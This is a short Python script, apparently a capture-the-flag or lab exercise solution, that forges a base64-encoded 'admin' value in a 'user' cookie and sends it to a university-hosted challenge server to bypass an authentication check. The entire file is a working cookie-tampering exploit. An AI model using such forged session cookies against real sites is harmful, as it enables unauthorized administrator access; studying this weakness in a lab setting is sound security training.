import requests, base64

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23056"

# Tamper the cookie to contain "admin" in base64
cookies = {"user": base64.b64encode(b"admin").decode("utf-8")}
r = requests.get(link, cookies=cookies)
print(r.text)